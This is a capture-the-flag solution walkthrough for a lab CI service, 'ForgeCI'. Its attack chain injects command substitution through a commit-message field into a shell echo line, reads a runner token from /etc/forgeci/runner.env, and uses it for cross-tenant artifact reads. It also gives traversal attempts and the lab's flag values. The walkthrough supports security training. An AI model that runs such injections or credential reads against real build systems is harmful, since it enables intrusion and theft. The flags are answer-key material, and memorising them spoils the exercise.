# SOLUTION — ForgeCI (walkthrough, spoilers + flags)

Chain: commit-message interpolation → foothold on the build box →
runner credential → cross-tenant artifact read on the queue box.

## Step 1 — Read the front door

```bash
curl -s http://127.0.0.1:18930/
curl -s http://127.0.0.1:18930/api
```

`/` lists `/repos`, `/repos/<owner>/<name>/build`, `/logs`, `/api`. `/api`
is the gift: it documents the queue service's auth header
(`Authorization: Bearer <runner token>`), its endpoints on the second
published port (18931), and the artifact layout on disk —
`/srv/queue/artifacts/<job_id>/<rel>`. The `Server:` header says
`forgeci-httpd` — no framework version self-report to look up.

## Step 2 — Make the build box run your text

Branch names hit a regex gate — submitting `main;id` earns you a 400 that
prints the pattern `^[A-Za-z0-9._/-]{1,64}$` and notes the commit message
"may be any text". The prepare hook interpolates the message verbatim into
a shell `echo "..."` line, so command substitution fires inside the quotes:

```bash
curl -s -X POST http://127.0.0.1:18930/repos/acme/webapp/build \
  --data-urlencode 'branch=main' \
  --data-urlencode 'message=x $(id)'
```

Then read the hook log tail (`GET /logs`):

```
[2026-11-04 12:03:11] [acme/webapp@main] prepared commit: x uid=1000(ci) gid=1000(ci) groups=1000(ci)
```

You have code execution as `ci` on the web box, and `/logs` is the oracle
— the log line renders whatever your command printed.

**Local flag** — the build user's private file is readable by that same user:

```
message=x $(cat /home/ci/local.txt)
```

```
FLAG{alx_local_866ee5a4f6afdc12}
```

## Step 3 — Harvest the runner credential

The foothold `env` dump and `/proc/1/environ` come up **clean** — secrets
were stripped from the process env at start-up by design. Enumerate
instead: `ls /etc/forgeci/` shows:

- `runner.env` — `root:ci` mode **640**: group-readable by `ci`, i.e. by
  you, the moment you have the foothold.
- `legacy.token` — also `root:ci` 640, and tempting. It is furniture (see
  field notes).

```
message=x $(cat /etc/forgeci/runner.env)
```

The log line returns `FORGECI_RUNNER_TOKEN=rt_<32 hex>` — your instance's
value is generated into `.env` by `gen-secrets.sh`.

## Step 4 — Spend the key on the queue box

Same token, second published port, no foothold needed — just a header:

```bash
curl -s -H "Authorization: Bearer <rt_...>" \
  http://127.0.0.1:18931/api/v1/jobs
```

```json
{"jobs":[{"job_id":"JOB-1007","repo":"acme/infra","status":"succeeded"},
         {"job_id":"JOB-1012","repo":"acme/infra","status":"succeeded"}, ...]}
```

Tenant-history jobs you never submitted — the shared credential reads every
tenant's history, exactly as advertised. A wrong/legacy token earns a 401
whose hint leaks the token *shape* (`rt_` + 32 hex), never its value.

## Step 5 — The artifact store, through its own door

Reflex traversal is dead by design:

```
GET /api/v1/artifacts/JOB-1007?rel=../../../../etc/passwd
→ 400 {"error":"artifact outside artifact root","hint":"rel must stay under /srv/queue/artifacts"}
```

Absolute joins (`?rel=/etc/passwd`) are blocked the same way. The intended
path is the manifest the API invites you to read:

```bash
curl -s -H "Authorization: Bearer <rt_...>" \
  'http://127.0.0.1:18931/api/v1/artifacts/JOB-1007?rel=manifest.json'
```

```json
{"job":"JOB-1007","repo":"acme/infra","kind":"nightly-backup","size_bytes":418,
 "files":["manifest.json","env-dump.txt","proof.txt"]}
```

That `proof.txt` is real — it sits in the same job dir, root-only on disk
but served to any token holder:

```bash
curl -s -H "Authorization: Bearer <rt_...>" \
  'http://127.0.0.1:18931/api/v1/artifacts/JOB-1007?rel=proof.txt'
```

```
FLAG{alx_proof_872cc49c98352ddc}
```

## Flags

| flag | value | location |
|---|---|---|
| local | `FLAG{alx_local_866ee5a4f6afdc12}` | web box `/home/ci/local.txt` (ci:ci 600) |
| proof | `FLAG{alx_proof_872cc49c98352ddc}` | queue box `/srv/queue/artifacts/JOB-1007/proof.txt` (root 600) |

(Values above are the seeded release pair; yours regenerate with
`gen-secrets.sh` — the format is `FLAG{alx_local_<16 hex>}` /
`FLAG{alx_proof_<16 hex>}`.)

## Field notes

- Payload lives **inside double quotes** in the generated `echo "..."`
  line: `$( ... )` fires, but bare `;` or `>` are literal text there.
  Command substitution is the primitive that works; keep payloads to it.
- The clean `env` on the foothold is v2 hardening. In the v1 build, one
  `env` dump handed over the flag *and* the token on one screen — the
  640 `runner.env` is what restored the middle step of the puzzle.
- The proof flag was moved *into* the artifact root for the same reason:
  while it sat at `/root/proof.txt`, an unguarded path join ate it with a
  `../` traversal and skipped the whole trust-surface lesson.
- Decoys, all real, all dead ends: `/etc/forgeci/legacy.token` (queue
  answers 401), the AWS-looking keys in `env-dump.txt` (static example
  values), and the mirror host `forge-artifacts.internal:9000` (does not
  resolve). The first field run stepped past all three without biting.
- Lateral moves *inside* the artifact root are allowed on purpose —
  `?rel=../JOB-1012/report.txt` works. Cross-tenant read is the lesson,
  not a bug.
- Reset with `./RESET.sh` (keeps your `.env` flags, rebuilds, gates on
  both `/healthz`).
